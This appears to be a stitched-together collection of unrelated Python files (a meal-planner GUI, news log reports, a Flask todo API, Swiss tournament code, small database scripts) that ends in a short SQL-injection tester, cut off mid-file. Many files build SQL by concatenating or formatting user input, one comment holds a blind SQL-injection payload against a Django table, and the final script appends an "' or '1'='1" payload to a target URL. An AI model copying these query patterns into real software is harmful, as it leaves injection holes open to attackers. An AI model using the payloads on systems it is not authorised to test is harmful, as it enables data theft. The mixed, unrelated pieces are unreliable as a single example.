    """ Ëé∑ÂèñÂçï‰∏™Áî®Êà∑ÔºåÊµãËØïsql Ê≥®ÂÖ•"""
    conn = sqlite3.connect(DB_FILE)                    

    sql = 'select * from home_user WHERE id={};'.format(user_id)
    print('sql', sql)                    
    cursor = conn.cursor()
    cursor.execute(sql)
    res = cursor.fetchall()
    return res                    
# sql select * from home_user WHERE id=2 AND SUBSTR((SELECT COALESCE(model,' ') FROM django_content_type LIMIT 5,1),7,1)>'l';


from tkinter import *
from addRecipe import AddARecipe
from tkinter import messagebox
import datetime
from mealPlan import MakeMealPlan
from PIL import Image, ImageTk
import sqlite3

LARGE_FONT=("Trebuchet MS", 24)
MEDIUM_FONT=("Trebuchet MS", 12)

recipeNames = []

class LandingPage(Frame):
    def __init__(self, parent, controller):
        Frame.__init__(self, parent)

        viewRecipeFrame = Frame(self, bg="#f8f8f8")
        menuFrame = Frame(self, bg="#e7e7e7")

        frame = Frame(self, bg="#f8f8f8")
        frame.pack(expand=True, fill='both')

        Label(frame, text="Trisha's Meal Planner", font=LARGE_FONT, bg="#f8f8f8", fg="#000000").pack(fill='both', pady=20)

        load = Image.open("recipe_card.jpg")
        render = ImageTk.PhotoImage(load)
        img = Label(frame, image = render, bg="#f8f8f8")
        img.image = render
        img.pack(fill='both', pady=40)

        Button(frame, text="Add A Recipe", highlightbackground="#f8f8f8", command=lambda: controller.show_frame(AddARecipe)).pack(fill=Y)
        Button(frame, text="Make a Meal Plan", highlightbackground="#f8f8f8", command=lambda: controller.show_frame(MakeMealPlan)).pack(fill=Y)
        Button(frame, text="View Recipes", highlightbackground="#f8f8f8", command=lambda: view_recipes()).pack(fill=Y)

        def view_recipes():
            frame.pack_forget()
            viewRecipeFrame.pack(expand=True, fill='both')                    

            database_file = "meal_planner.db"
            with sqlite3.connect(database_file) as conn:
                cursor = conn.cursor()
                selection = cursor.execute("""SELECT * FROM recipe""")
                for result in [selection]:
                    for row in result.fetchall():
                        name = row[0]
                        recipeNames.append(name)
            conn.close()
            for i in range(len(recipeNames)):
                label = Label(viewRecipeFrame, font=MEDIUM_FONT, bg="#f8f8f8", fg="#000000", text=recipeNames[i])
                label.pack()
                label.bind("<Button-1>", lambda  event, x=recipeNames[i]: [callback(x), viewRecipeFrame.pack_forget()])


        def callback(recipeName):
                viewRecipeFrame.pack_forget()
                database_file = "meal_planner.db"

                menuFrame.pack(fill='both')
                load = Image.open("home.jpg")
                render = ImageTk.PhotoImage(load)
                img = Button(menuFrame, image=render, borderwidth=0, highlightthickness=0,
                             highlightbackground="#e7e7e7",
                             command=lambda: [frame.pack(expand=True, fill='both'), menuFrame.pack_forget(), viewDetailsFrame.pack_forget()])
                img.image = render
                img.pack(side=LEFT)
                label = Label(menuFrame, text="View Recipe", font=LARGE_FONT, bg="#e7e7e7", fg="#272822")
                label.pack(side=LEFT, padx=300)

                viewDetailsFrame = Frame(self, bg="#f8f8f8")                    
                viewDetailsFrame.pack(expand=True, fill='both')
                with sqlite3.connect(database_file) as conn:
                    cursor = conn.cursor()
                    selection = cursor.execute("""SELECT * FROM recipe WHERE name = """ + "\"" + recipeName + "\"" )                    
                    for result in [selection]:
                        for row in result.fetchall():
                            name = row[0]
                            time = row[1]
                            servings = row[2]
                            favorite = row[3]
                            ingredients = row[4]
                            directions = row[5]
                    string = ("Name: {} \n Cook time: {} \n Number of Servings: {} \n Ingredients: {} \n Directions: {}".format(name, time, servings, ingredients, directions))
                    Label(viewDetailsFrame, text=string, font=MEDIUM_FONT, bg="#f8f8f8", fg="#000000").pack(side=LEFT)
                conn.close()

                Button(menuFrame, text="Delete", highlightbackground="#e7e7e7",
                       command=lambda: delete_recipe(name)).pack(side=RIGHT)

        def delete_recipe(recipeName):
            database_file = "meal_planner.db"

            now = datetime.datetime.now()
            dt = datetime.date(now.year, now.month, now.day)
            weekNumber = dt.isocalendar()[1]

            tableName = "recipes_" + str(weekNumber)
            with sqlite3.connect(database_file) as conn:
                cursor = conn.cursor()
                cursor.execute("""SELECT recipe FROM """ + tableName + """ WHERE recipe = """ + "\"" + recipeName + "\"")                    
                returnObject = cursor.fetchone()                    
                if returnObject:                    
                    print(returnObject[0])                    
                    messagebox.showerror("Cannot Delete",                    
                                         "Cannot delete recipe when it's used in the current week's menu.")
                    # conn.close()
                else:                    
                    # conn.close()
                    actually_delete(recipeName)                    

        def actually_delete(recipeName):                    
            queryString = "\"" + recipeName + "\""                    
            with sqlite3.connect("meal_planner.db") as conn:
                cursor = conn.cursor()
                cursor.execute("""DELETE FROM recipe WHERE name = """ + "\"" + recipeName + "\"")                    
                print(cursor.rowcount)                    
                if cursor.rowcount == 1:
                    messagebox.showinfo("Success", "Recipe Deleted.")
                    menuFrame.pack_forget()
                    viewRecipeFrame.pack(expand=True, fill='both')                    
                elif cursor.rowcount == 0:
                    messagebox.showerror("Cannot Delete",                    
                                         "Cannot delete recipe, please try again.")                    
            conn.close()







from tkinter import *
import datetime
from isoweek import Week
from tkinter import ttk
import sqlite3
from PIL import Image, ImageTk

LARGE_FONT=("Trebuchet MS", 24)
MEDIUM_FONT=("Trebuchet MS", 14)


class MakeMealPlan(Frame):
    def __init__(self, parent, controller):
        Frame.__init__(self, parent, bg="#f8f8f8")
        menuFrame = Frame(self, bg="#e7e7e7")
        menuFrame.pack(fill='both')
        load = Image.open("home.jpg")
        render = ImageTk.PhotoImage(load)
        from landingpage import LandingPage
        img = Button(menuFrame, image=render, borderwidth=0, highlightthickness=0, highlightbackground="#e7e7e7",
                     command=lambda: controller.show_frame(LandingPage))
        img.image = render
        img.pack(side=LEFT)

        label = Label(menuFrame, text="Meal Planner", font=LARGE_FONT, bg="#e7e7e7", fg="#272822")
        label.pack(side=LEFT, padx=289)

        groceryButton = Button(menuFrame, text="Grocery List", highlightbackground="#e7e7e7", command=lambda: view_grocery_list())
        groceryButton.pack(side=LEFT)

        viewRecipeFrame = Frame(self, bg="#f8f8f8")

        now = datetime.datetime.now()
        dt = datetime.date(now.year, now.month, now.day)
        weekNumber = dt.isocalendar()[1]
        w = Week(now.year, weekNumber)

        menu = Frame(self, bg="#f8f8f8")
        menu.rowconfigure(0, weight=1)
        menu.columnconfigure(0, weight=1)
        menu.rowconfigure(1, weight=3)
        menu.columnconfigure(1, weight=3)
        menu.pack()

        columnLabels = ["Breakfast", "Lunch", "Dinner"]
        for i in range(len(columnLabels)):
            Label(menu, text=columnLabels[i], font=("Trebuchet MS", 16), bg="#f8f8f8").grid(row=0, column=i+2, pady= 10,
                                                                                        padx=85, sticky="nsew")
        mondayText = "Monday " + str(w.monday())
        tuesdayText = "Tuesday " + str(w.tuesday())
        wednesdayText = "Wednesday " + str(w.wednesday())
        thursdayText = "Thursday " + str(w.thursday())
        fridayText = "Friday " + str(w.friday())
        saturdayText = "Saturday " + str(w.saturday())
        sundayText = "Sunday " + str(w.sunday())

        labels = [mondayText, tuesdayText, wednesdayText, thursdayText, fridayText, saturdayText, sundayText]
        for i in range(len(labels)):
            Label(menu, font=("Trebuchet MS", 12), bg="#f8f8f8", text=labels[i]).grid(row=i+1, column=0, padx = 5, pady=15, sticky="w")
            sep = ttk.Separator(menu, orient="vertical")
            sep.grid(row=i+1, column=1, padx=5, sticky="nsew")

        buttonDict = {}
        listOfButtons = []
        for rows in range(len(labels)):
            for columns in range(len(columnLabels)):
                buttons = Button(menu, text="Add meal to day", highlightbackground="#f8f8f8", command=lambda x=rows + 1, y=columns + 2: add_meal(x, y))
                buttons.grid(row=rows+1, column=columns+2)
                buttons.position = (rows+1, columns+2)
                buttonDict[buttons] = buttons.position
                listOfButtons.append(buttons)

        def add_meal(rowLocation, columnLocation):
            menu.pack_forget()
            viewRecipeFrame.forget()
            add_meal_frame = Frame(self, bg="#f8f8f8")
            add_meal_frame.rowconfigure(0, weight=1)
            add_meal_frame.columnconfigure(0, weight=1)
            add_meal_frame.rowconfigure(1, weight=3)
            add_meal_frame.columnconfigure(1, weight=3)
            add_meal_frame.pack()

            recipeNames = []
            ingredientList = []
            database_file = "meal_planner.db"
            with sqlite3.connect(database_file) as conn:
                cursor = conn.cursor()
                selection = cursor.execute("""SELECT * FROM recipe""")
                for result in [selection]:
                    for row in result.fetchall():
                        name = row[0]
                        ingredients = row[4]
                        recipeNames.append(name)
                        ingredientList.append(ingredients)
            for i in range(len(recipeNames)):
                Button(add_meal_frame, text=recipeNames[i], highlightbackground="#f8f8f8", command=lambda x=recipeNames[i], y=ingredientList[i]:add_recipe(x, y, add_meal_frame,
                                                                                     rowLocation, columnLocation)).grid(row=i, column=0)

        def add_recipe(recipe, ingredients, view, row, column):
            view.pack_forget()
            viewRecipeFrame.forget()
            searchIndex = (row, column)
            for key, value in buttonDict.items():
                if value == searchIndex:
                    key.destroy()
            save_weeks_recipes(recipe, row, column)
            save_ingredients(ingredients)
            recipeLabel = Label(menu, text=recipe, bg="#f8f8f8")
            recipeLabel.grid(row = row, column = column)
            recipeLabel.bind("<Button-1>", lambda event: callback(recipe))
            menu.pack()

        def callback(recipeName):
            menu.pack_forget()
            viewRecipeFrame.pack(expand=True, fill='both')
            groceryButton.pack_forget()
            database_file = "meal_planner.db"
            print(recipeName)
            with sqlite3.connect(database_file) as conn:
                cursor = conn.cursor()
                selection = cursor.execute("""SELECT * FROM recipe WHERE name = """ + "\"" + recipeName + "\"")                    
                for result in [selection]:
                    for row in result.fetchall():
                        name = row[0]
                        time = row[1]
                        servings = row[2]
                        ingredients = row[4]
                        directions = row[5]

                        string = ("Name: {} \n Cook time: {} \n Number of Servings: {} \n ".format(name, time, servings))
                        secondString = ("Ingredients: {}".format(ingredients))
                        thirdString = ("Directions: {}".format(directions))
            Label(viewRecipeFrame, text=string, font=MEDIUM_FONT, bg="#f8f8f8", fg="#000000").pack(side=TOP)
            Label(viewRecipeFrame, text=secondString, font=MEDIUM_FONT, bg="#f8f8f8", fg="#000000").pack(side=TOP)
            Label(viewRecipeFrame, text=thirdString, font=MEDIUM_FONT, bg="#f8f8f8", fg="#000000").pack(side=TOP)
            returnButton = Button(menuFrame, text = "Return to Menu", highlightbackground="#e7e7e7", command=lambda: [viewRecipeFrame.pack_forget(),
                                                                                     menu.pack(), returnButton.pack_forget(), label.configure(text="Meal Planer"),
                                                                                    groceryButton.pack(side=RIGHT)])
            returnButton.pack(side=RIGHT)


        def view_grocery_list():
            print("grocery== list")
            groceryListFrame = Frame(self)
            groceryListFrame.rowconfigure(0, weight=1)
            groceryListFrame.columnconfigure(0, weight=1)
            groceryListFrame.rowconfigure(1, weight=3)
            groceryListFrame.columnconfigure(1, weight=3)
            groceryListFrame.pack()

            menu.pack_forget()
            groceryButton.pack_forget()
            label.configure(text="Grocery List")

            i = 0
            database_file = "meal_planner.db"
            item_array = []
            with sqlite3.connect(database_file) as conn:
                cursor = conn.cursor()
                tableName = "ingredients_" + str(weekNumber)
                selection = cursor.execute("""SELECT * FROM """ + tableName)                    
                for result in [selection]:
                    for row in result.fetchall():
                        print(row)
                        for ingredient in row:
                            print(ingredient)
                            item_array.append(str(ingredient).split())
                        i = i +1
                        Label(groceryListFrame, text=ingredient, font=MEDIUM_FONT, justify=LEFT).grid(row=i, column=0, sticky="w")
            

            j = 0
            for item in item_array:
                print(item)


            returnButton = Button(menuFrame, text = "Return to Menu", highlightbackground="#e7e7e7", command=lambda: [groceryListFrame.pack_forget(),
                                                                                     menu.pack(), returnButton.pack_forget(), label.configure(text="Meal Planer"),
                                                                                    groceryButton.pack(side=RIGHT)])
            returnButton.pack(side=RIGHT)


        def save_ingredients(ingredients):
            database_file = "meal_planner.db"
            with sqlite3.connect(database_file) as conn:
                # create the table if it hasn't been created yet
                tableName = "ingredients_" + str(weekNumber)
                conn.execute('''CREATE TABLE IF NOT EXISTS ''' + tableName + ''' (ingredients text)''')
                conn.execute("""INSERT INTO """ + tableName + """ VALUES (?);""", (ingredients,))
            
        def save_weeks_recipes(recipeName, row, column):
            print("save weeks")
            database_file = "meal_planner.db"
            with sqlite3.connect(database_file) as conn:
                # create the table if it hasn't been created yet
                tableName = "recipes_" + str(weekNumber)
                conn.execute('''CREATE TABLE IF NOT EXISTS ''' + tableName + ''' (recipe text, row int, column int)''')
                conn.execute("""INSERT INTO """ + tableName + """ VALUES (?, ?, ?);""", (recipeName, row, column))
            

#!/usr/bin/env python3
import psycopg2

DBNAME = "news"


def get_top_articles(list_count):
    """Return article and number of times viewed with most viewed first."""
    query = (                    
        'select a.title, count(alv.article) as views from articles a, '                    
        ' article_log_view alv where a.slug = alv.article '
        ' group by a.title '
        ' order by count(alv.article) desc limit %d;' % list_count)
    db = psycopg2.connect(database=DBNAME)
    c = db.cursor()
    c.execute(query)                    
    rows = c.fetchall()
    db.close()
    return rows


def get_top_authors():
    """Return author and number of views with most viewed first."""
    query = (                    
        'select au.name, count(alv.article) as views '                    
        ' from articles a inner join article_log_view alv '
        ' on a.slug = alv.article '
        ' inner join authors au '
        ' on a.author = au.id '
        ' group by au.name '
        ' order by count(alv.article) desc;')
    db = psycopg2.connect(database=DBNAME)
    c = db.cursor()
    c.execute(query)                    
    rows = c.fetchall()
    db.close()
    return rows


def get_most_error_day():
    """Return day with errors > 1%."""
    query = (                    
        'select tot.logdate, '                    
        ' round(((err.errors_count::decimal/tot.requests_count)*100),2) '
        ' as err_pct '
        ' from '
        ' ( select to_char(time, \'FMMonth DD, YYYY\') as logdate, '
        ' count(*) as requests_count '
        ' from log '
        ' group by to_char(time, \'FMMonth DD, YYYY\') ) tot, '
        '( select to_char(time, \'FMMonth DD, YYYY\') as logdate,  '
        ' count(*) as errors_count '
        ' from log '
        ' where status <> \'200 OK\' '
        ' group by to_char(time, \'FMMonth DD, YYYY\') ) err '                    
        ' where '
        ' tot.logdate = err.logdate '
        ' and (err.errors_count::decimal/tot.requests_count) > .01; ')
    db = psycopg2.connect(database=DBNAME)
    c = db.cursor()
    c.execute(query)                    
    rows = c.fetchall()
    db.close()
    return rows


def print_top_articles(list_count):
    """Prints the articles and number of times viewed."""
    print("What are the most popular %d articles of all time?\n" % list_count)
    top_articles = "\"%s\" - %d views\n"
    results = "".join(
        top_articles % (title, views) for title, views in get_top_articles(
            list_count))
    print(results)


def print_top_authors():                    
    """Prints the author and total times their article were viewed."""
    print("What are the most popular article authors of all time?\n")
    top_authors = "%s - %d views\n"
    results = "".join(
        top_authors % (name, views) for name, views in get_top_authors())
    print(results)


def print_top_errors():                    
    """Prints day(s) where requests had more than 1 percent error."""
    print("On which days did more than 1% of requests lead to errors?\n")
    top_authors = "%s - % 6.2f%% errors\n"
    results = "".join(
        top_authors % (
            logdate, err_pct) for logdate, err_pct in get_most_error_day())
    print(results)


print_top_articles(3)                    
print_top_authors()                    
print_top_errors()                    

import psycopg2

config = {}

def get_all():
    connection = psycopg2.connect(host=config['HOST'], port=config['PORT'], database=config['NAME'], user=config['USER'], password=config['PASSWORD'])
    cur = connection.cursor()
    cur.execute("select * from reply_map")
    out = {}
    for row in cur:
        out[row[0]] = row[1]
    connection.commit()
    return out

def insert(key, value):
    connection = psycopg2.connect(host=config['HOST'], port=config['PORT'], database=config['NAME'], user=config['USER'], password=config['PASSWORD'])
    cur = connection.cursor()
    try:
        cur.execute("insert into reply_map values('{}', '{}')".format(key, value))                    
        connection.commit()
    except:
        pass

if __name__ == '__main__':
    connection = psycopg2.connect(host=config['HOST'], port=config['PORT'], database=config['NAME'], user=config['USER'], password=config['PASSWORD'])
    cur = connection.cursor()
    cur.execute("create table reply_map(key text not null unique, value text not null)")
    connection.commit()

from django.utils import timezone
from django.db.models import Avg, Count, Min, Max, Sum


def navbarmain(request):
    from pages.models import Post
    navbarMain = Post.objects.filter(published_date__lte=timezone.now())                    
    # print(Post.objects.values('subject').annotate(newest_published_date=Max('published_date')))
    pb = Post.objects.values('subject').annotate(newest_published_date=Max('published_date'))                    
    pb_list = Post.objects.filter(subject__in=[b.get('subject') for b in pb], published_date__in=[b.get('newest_published_date') for b in pb])                    
    # print(pb_list)
    return {'navbarMain': pb_list}                    

#!/usr/bin/python3
"""
Database storage engine
"""
from sqlalchemy import create_engine, MetaData
from sqlalchemy.orm import sessionmaker, scoped_session
from models.base_model import Base
from models import base_model, task, user                    
from models.secrets import USER, PW, HOST, DB

class DBStorage:
    """
    handles long term storage of all class instances
    """
    CNC = {
        'Task': task.Task,
        'User': user.User,                    
    }
    __engine = None
    __session = None

    def __init__(self):
        """
        creates the engine self.__engine
        """
        self.__engine = create_engine(
            'mysql+mysqldb://{}:{}@{}:3306/{}'
            .format(USER, PW, HOST, DB)
        )

    def all(self, cls=None):
        """
        returns a dictionary of all objects
        """
        obj_dict = {}
        if cls is not None:
            a_query = self.__session.query(DBStorage.CNC[cls])
            for obj in a_query:
                obj_ref = "{}.{}".format(type(obj).__name__, obj.id)
                if cls == 'User' and obj.tasks:
                    pass
                obj_dict[obj_ref] = obj
            return obj_dict

        for c in DBStorage.CNC.values():
            a_query = self.__session.query(c)
            for obj in a_query:
                obj_ref = "{}.{}".format(type(obj).__name__, obj.id)
                if type(c).__name__ == 'User' and obj.tasks:
                    pass
                obj_dict[obj_ref] = obj
        return obj_dict

    def new(self, obj):
        """
            adds objects to current database session
        """
        self.__session.add(obj)

    def save(self):
        """
            commits all changes of current database session
        """
        self.__session.commit()

    def rollback_session(self):
        """
            rollsback a session in the event of an exception
        """
        self.__session.rollback()

    def delete(self, obj=None):
        """
            deletes obj from current database session if not None
        """
        if obj:
            self.__session.delete(obj)
            self.save()

    def delete_all(self):
        """
           deletes all stored objects, for testing purposes
        """
        for c in DBStorage.CNC.values():
            a_query = self.__session.query(c)
            all_objs = [obj for obj in a_query]
            for obj in range(len(all_objs)):
                to_delete = all_objs.pop(0)
                to_delete.delete()
        self.save()

    def reload(self):
        """
           creates all tables in database & session from engine
        """
        Base.metadata.create_all(self.__engine)
        self.__session = scoped_session(
            sessionmaker(
                bind=self.__engine,
                expire_on_commit=False))

    def close(self):
        """
            calls remove() on private session attribute (self.session)
        """
        self.__session.remove()

    def get(self, cls, id):                    
        """
        retrieves one object based on class name and id                    
        """
        if cls and id:                    
            fetch = "{}.{}".format(cls, id)                    
            all_obj = self.all(cls)                    
            return all_obj.get(fetch)                    
        return None                    

    def count(self, cls=None):                    
        """
            returns the count of all objects in storage                    
        """
        return (len(self.all(cls)))                    

#!/usr/bin/env python3
"""
Flask App for Todo List MVP
"""
from flask import abort, Flask, jsonify
from flask import render_template, request, url_for
import json
from models import storage, Task, User, REQUIRED, PORT, HOST
import requests
from uuid import uuid4


# flask setup
app = Flask(__name__)
app.url_map.strict_slashes = False
ERRORS = [
    "Not a JSON", "Missing required information", "Missing id",
    "Wrong id type"
]

def api_response(state, message, code):
    """
    Method to handle errors with api
    """
    response = { state: message, "status_code": code }
    resp_json = jsonify(message)
    return resp_json

@app.teardown_appcontext
def teardown_db(exception):
    """
    after each request, this method calls .close() (i.e. .remove()) on
    the current SQLAlchemy Session
    """
    storage.close()

@app.route('/', methods=['GET'])
def main_index():
    """
    handles request to main index.html
    """
    if request.method == 'GET':
        cache_id = uuid4()
        return render_template('index.html', cache_id=cache_id)

def make_todo_list(verified_user):
    """
    makes JSON todo list for client
    """
    todo_list = {}
    todo_list['userInfo'] = verified_user.to_json()
    all_tasks = todo_list['userInfo'].pop('tasks')
    return all_tasks


@app.route('/api/<fbid>', methods=['GET'])
def api_get_handler(fbid=None):
    """
    handles api get requests
    """
    if fbid is None:
        return api_response("error", "Unknown id", 401)
    all_users = storage.all('User').values()                    
    verified_user = None                    
    for user in all_users:                    
        this_fbid = User.text_decrypt(user.fbid)                    
        if fbid == this_fbid:                    
            verified_user = user                    
            break                    
    if verified_user is None:
        return api_response("error", "Unknown id", 401)
    all_tasks = make_todo_list(verified_user)
    return jsonify(all_tasks), 201

def initialize_new_task_list(user_info, all_tasks):
    """
    initializes new task and user from POST request
    """
    new_user = User(**user_info)
    new_user.save()
    user_id = new_user.id
    for task in all_tasks.values():
        task['user_id'] = user_id
        new_task = Task(**task)
        new_task.save()
    return "new user and tasks created"

def update_user_tasks(verified_user, all_tasks):
    """
    updates user task information
    """
    user_id = verified_user.id
    db_user_tasks = verified_user.tasks
    db_user_task_ids = set([task.id for task in db_user_tasks])
    for task_id, task in all_tasks.items():
        if task_id in db_user_task_ids:
            print(db_user_task_ids)                    
            db_user_task_ids.remove(task_id)
            verified_user.bm_update(task)
        else:
            task['user_id'] = user_id
            new_task = Task(**task)
            new_task.save()
    if len(db_user_task_ids) > 0:
        for task_id in db_user_task_ids:
            task_to_delete = storage.get("Task", task_id)
            task_to_delete.delete()                    
            print('deleted task')                    
    return "new tasks updated & created"

def verify_proper_post_request(req_data):
    """
    verifies that proper request has been made
    """
    if req_data is None:
        return 0
    user_info = req_data.get('userInfo', None)
    if user_info is None:
        return 1
    fbid = user_info.get('fbid', None)
    if fbid is None:
        return 2
    if type(fbid) == 'int':
        return 3
    return fbid


@app.route('/api', methods=['POST'])
def api_post_handler():
    """
    handles api post requests
    """
    req_data = request.get_json()
    verification = verify_proper_post_request(req_data)
    if type(verification).__name__ == "int":
        return api_response("error", ERRORS[verification], 400)
    user_info = req_data.get('userInfo', None)
    all_tasks = req_data.get('allTasks', None)
    if user_info is None or all_tasks is None:
        return api_response("error", "Missing required information", 400)
    for req in REQUIRED:
        if req not in user_info:
            return api_response("error", "Missing attribute", 400)
    all_users = storage.all('User').values()                    
    verified_user = None                    
    for user in all_users:                    
        this_fbid = User.text_decrypt(user.fbid)                    
        if verification == this_fbid:
            verified_user = user                    
            break                    
    if verified_user is None:
        message = initialize_new_task_list(user_info, all_tasks)
        return api_response("success", message, 200)
    else:
        message = update_user_tasks(verified_user, all_tasks)
        return api_response("success", message, 200)

@app.errorhandler(404)
def page_not_found(error):
    cache_id = uuid4()
    return render_template('404.html', cache_id=cache_id), 404


if __name__ == "__main__":
    """
    MAIN Flask App
    """
    app.run(host=HOST, port=PORT)

#!/usr/bin/env python
# 
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2
import bleach                    


def connect():
    """Connect to the PostgreSQL database.  Returns a database connection."""
    return psycopg2.connect("dbname=tournament")


def execute(query, params=None):
    conn = connect()
    c = conn.cursor()
    if not params:
        c.execute(query)
    else:
        c.execute(query, params)
    conn.commit()
    conn.close()


def fetchone(query):
    conn = connect()
    cur = conn.cursor()
    cur.execute(query)
    result = cur.fetchone()[0]
    conn.close()
    return result 


def fetchall(query):
    conn = connect()
    cur = conn.cursor()
    cur.execute(query)
    records = cur.fetchall()
    conn.close()
    return records


def deleteMatches():
    """Remove all the match records from the database."""
    execute("delete from Match")


def deletePlayers():
    """Remove all the player records from the database."""
    execute("delete from Player")


def countPlayers():
    """Returns the number of players currently registered."""
    return fetchone("select count(*) from Player")


def registerPlayer(name):
    """Adds a player to the tournament database.
  
    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)
  
    Args:
      name: the player's full name (need not be unique).
    """

    # prevent xss
    name = bleach.clean(name)                    

    execute("insert into Player(name) values(%s)", (name,))


def playerStandings():
    """Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """
    return fetchall("select * from player_static_view order by wins")


def reportMatch(winner, loser):
    """Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost
    """

    # prevent xss
    winner = bleach.clean(str(winner))                    
    loser = bleach.clean(str(loser))                    

    execute("insert into Match(winner, loser) values(%s, %s)", (winner, loser, ))
 
 
def swissPairings():
    """Returns a list of pairs of players for the next round of a match.
  
    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings. Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.
  
    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """
    # fetch data
    records = fetchall("select * from player_static_view order by wins desc")

    # split data into pairs
    count = 0
    length = len(records)
    pairs = []
    while count < length:
        pairs.append((
            records[count][0],
            records[count][1],
            records[count+1][0],
            records[count+1][1],
        ))
        count += 2
    return pairs




#!/usr/bin/env python
# 
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2
import re


def connect():
    """Connect to the PostgreSQL database.  Returns a database connection."""
    return psycopg2.connect("dbname=tournament")


def deleteMatches():
    """Remove all the match records from the database."""
    conn = connect()
    c = conn.cursor()
    table = "matches"
    playerTable = "players"
    c.execute("DELETE FROM %s;" % (table,))                    
    # UPDATE statement is to reset all values to default after deleting all
    # rows from matches table
    c.execute("""UPDATE %s SET wins = 0,                     
        loss = 0, matchesPlayed = 0""" % (playerTable,))                    
    conn.commit()
    conn.close()

def deletePlayers():
    """Remove all the player records from the database."""
    conn = connect()
    table = "players"
    c = conn.cursor()
    c.execute("DELETE FROM %s;" % (table,))                    
    conn.commit()
    conn.close()

def countPlayers():
    """Returns the number of players currently registered."""
    conn = connect()
    table = "players"
    c = conn.cursor()
    c.execute("SELECT COUNT(playerID) FROM %s;" % (table,))                    
    result = c.fetchone()[0]
    conn.commit()
    conn.close()
    return result

def registerPlayer(name):                                                                   
    """Adds a player to the tournament database.                                            
    The database assigns a unique serial id number for the player.  (This                   
    should be handled by your SQL database schema, not in your Python code.)                
                                                                                            
    Args:                                                                                   
      name: the player's full name (need not be unique).                                    
    """                                                                                     
    conn = connect()                                                                        
    c = conn.cursor()                                                                       
    # Regex is used here for instances where we might have apostrophes in one's             
    # name                                                                                  
    c.execute("INSERT INTO players (playerName) VALUES ('{}')".format(                      
        re.sub(r'\'', '', name)));                                                          
    conn.commit()                                                                           
    conn.close()                                                                            
                                                                                            
def playerStandings():                                                                      
    """Returns a list of the players and their win records, sorted by wins.                 
                                                                                            
    The first entry in the list should be the player in first place, or a player            
    tied for first place if there is currently a tie.                                       
                                                                                            
    Returns:                                                                                
      A list of tuples, each of which contains (id, name, wins, matches):                   
        id: the player's unique id (assigned by the database)                               
        name: the player's full name (as registered)                                        
        wins: the number of matches the player has won                                      
        matches: the number of matches the player has played                                
    """                                                                                     
    conn = connect()                                                                        
    c = conn.cursor()                                                                       
    table = "players"                                                                       
    c.execute("""SELECT playerID,                                                           
        playerName,                                                                         
        wins,                                                                               
        matchesPlayed FROM %s ORDER BY wins DESC;""" % (table,))                            
    result = c.fetchall()                                                                   
    conn.commit()                                                                           
    conn.close()                                                                            
    return result                                                                           
                                                                                            
def reportMatch(winner, loser):                                                             
    """Records the outcome of a single match between two players.                           
                                                                                            
    Args:                                                                                   
      winner:  the id number of the player who won                                          
      loser:  the id number of the player who lost                                          
    """                                                                                     
    conn = connect()                                                                        
    c = conn.cursor()                                                                       
    # Inserts a row into the matches table, and updates subsequent data                     
    c.execute("""INSERT INTO matches (winner, loser)                                        
        VALUES ('%i', '%i')""" % (winner, loser))                                           
    c.execute("""UPDATE players SET wins = wins + 1,                                        
        matchesPlayed = matchesPlayed + 1                                                   
        WHERE playerID = %s""" % (winner,))                                                 
    c.execute("""UPDATE players SET loss = loss + 1,                                        
        matchesPlayed = matchesPlayed + 1                                                   
        WHERE playerID = %s""" % (loser,))                                                  
    conn.commit()                                                                           
    conn.close()                                                                            
                                                                                            
def swissPairings():                                                                        
    """Returns a list of pairs of players for the next round of a match.                    
                                                                                            
    Assuming that there are an even number of players registered, each player               
    appears exactly once in the pairings.  Each player is paired with another               
    player with an equal or nearly-equal win record, that is, a player adjacent             
    to him or her in the standings.                                                         
                                                                                            
    Returns:                                                                                
      A list of tuples, each of which contains (id1, name1, id2, name2)                     
        id1: the first player's unique id                                                   
        name1: the first player's name                                                      
        id2: the second player's unique id                                                  
        name2: the second player's name                                                     
    """                                                                                     
    conn = connect()                                                                        
    c = conn.cursor()                                                                       
    table = "players"                                                                       
    c.execute("""SELECT playerID,                                                           
        playerName FROM %s ORDER BY wins DESC;""" % (table,))                               
    result = c.fetchall()
    pairings = list()
    if (result % 2 != 0):
        return None                    
    else:                                                                   
    # For loop to simply pair up adjacent players based on                                  
    # already sorted value from the playerStandings() method                                
        for i in range(0, len(result), 2):                                                      
            tmpList = result[i:i+2]                                                             
            temp1 = tmpList[0]                                                                  
            temp2 = tmpList[1]                                                                  
            pairings.append((temp1[0], temp1[1], temp2[0], temp2[1]))                           
        return pairings   
    return None                     

#!/usr/bin/python3
"""
1-filter_states.py
"""
import MySQLdb
import sys


def init_db():
    """initializes a db with MySQLdb"""
    db = MySQLdb.connect(host='localhost',
                         port=3306,
                         user=sys.argv[1],
                         passwd=sys.argv[2],
                         db=sys.argv[3])
    return db


def print_states_N(db):
    """prints all states with first initial 'N' from input DB"""
    cur = db.cursor()
    cur.execute("SELECT * FROM states "
                "WHERE name LIKE BINARY 'N%' "
                "ORDER BY states.id ASC")
    rows = cur.fetchall()                    
    for row in rows:                    
        print(row)
    cur.close()
    db.close()


if __name__ == "__main__":
    print_states_N(init_db())

import sys
import urllib
import urllib.request

# example : http://mywebsite.com/index.php?item=42
# this script will check if the parameter 'item' is injectable

uri = None

for carg in sys.argv:                    
	# read the arg that follow -w
	if carg == "-w":
		arg_num = sys.argv.index(carg)                    
		arg_num += 1                    
		if len(sys.argv) > arg_num:                    
			uri = sys.argv[arg_num]                    

# if there is no value for -w parameter, throw an error and exit
if uri is None:
	sys.exit("[ERROR] You have to pass the URI to test to the -w parameter !")

injected_url = uri + "1'%20or%20'1'%20=%20'1"                    

# make the request
resp = urllib.request.urlopen(injected_url)                    

# parse response
body = resp.read()
full_body = body.decode('utf-8')

# check vulnerability by looking at the response
